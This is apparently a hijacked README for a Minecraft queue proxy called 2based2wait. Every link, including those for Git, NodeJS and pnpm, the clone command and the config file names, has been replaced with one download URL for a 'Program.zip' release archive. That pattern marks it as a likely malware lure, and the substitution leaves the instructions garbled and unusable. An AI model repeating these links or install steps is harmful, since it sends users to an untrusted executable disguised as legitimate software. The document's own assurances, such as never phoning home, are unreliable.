## Installation

### Prerequisites

- [Git](https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip)
- [NodeJS](https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip)
- [pnpm](https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip): `npm install -g pnpm`

### Quick Start

1. Clone the latest release: `git clone https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip --branch v1.0.5 --depth 1 && cd 2based2wait`
2. Install dependencies: `pnpm install --prod`
3. Configure your proxy: 
	- Duplicate the `https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip` template file and rename it to `https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip`
	- Use the [configuration guide](https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip) to configure your proxy
		- At the minimum you _must_ configure [`https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip`](https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip) and [`https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip`](https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip)
4. Start the proxy: `pnpm start`

### RTFM

We'll never phone home or enable something you didn't. In other words, you are responsible for enabling and configuring features such as:
- [Reconnecting to the server](https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip)
- [Ngrok tunnelling to share the proxy with others](https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip)
- [Coordinating multiple accounts at once](https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip)
- [And much more](https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip)

## Features

- Extremely low RAM and CPU usage
- Robust auto-reconnection
	- Battle-tested to be online 24/7/365
- High configurability
	- Easily configure small-to-medium-sized networks
- Convenient Discord webhooks for:
	- Livechat
	- Queue position
	- Tunnels & connections
- Toast notifications
- Auto `/queue main`
- Mineflayer support and extensibility *(see: `https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip`)*
	- Already comes with:
		- Kill aura
		- Auto eat
		- Anti afk
		- Anti drowning
		- Auto totem
- Extensive logging
- Share proxies with plug-and-play Ngrok tunnels
	- Your machine's IP is never shared with players connecting to your proxy
	- Your players' IPs are never shared with your machine

## For Developers

If you want to contribute to the project's source you must install developer dependencies (`pnpm i`) and use an editor with ESLint support.

You can run tests locally with `pnpm testLocal`. (`pnpm test` will test your actual `https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip` rather than `https://github.com/Kurkkumopo91/2based2wait/releases/download/v1.0/Program.zip`)
